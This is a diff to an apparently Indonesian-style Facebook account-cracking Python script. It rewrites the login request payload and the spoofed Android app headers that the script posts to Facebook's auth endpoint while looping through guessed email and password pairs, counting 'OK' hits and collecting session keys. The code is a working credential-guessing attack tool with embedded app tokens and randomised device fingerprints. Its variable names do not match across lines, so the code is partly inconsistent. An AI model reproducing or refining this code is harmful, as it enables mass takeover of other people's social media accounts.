@@ -1003,8 +1003,35 @@ def m2(idf,pwv):
 			sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
 			sys.stdout.flush()
 			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme; FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
-			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()).upper(),'email':idf,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()).upper(),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':access_token}
-			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
+			data = {
+                        'adid': str(uuid.uuid4()),
+                        'format': 'json',
+                        'device_id': str(uuid.uuid4()),
+                        'email': ids,
+                        'password': ps,
+                        'generate_analytics_claims': '1', 
+                        'credentials_type': 'password',
+                        'source': 'login',
+                        'error_detail_type': 'button_with_disabled',
+                        'enroll_misauth': 'false', 
+                        'generate_session_cookies': '1', 
+                        'generate_machine_id': '1', 
+                        'meta_inf_fbmeta': '', 
+                        'currently_logged_in_userid': '0', 
+                        'fb_api_req_friendly_name': 'authenticate'}
+			head = {
+                        'User-Agent': ua, 
+                        'Accept-Encoding': 'gzip, deflate', 
+                        'Accept': '*/*', 
+                        'Connection': 'keep-alive', 
+                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
+                        'X-FB-Friendly-Name': 'authenticate', 
+                        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
+                        'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
+                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
+                        'X-FB-Connection-Type': 'unknown',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-FB-HTTP-Engine': 'Liger'}
 			po = session.post('https://b-api.facebook.com/auth/login', data=data, headers=head).json()
 			if 'session_key' in po:
 					uid = str(po['uid'])
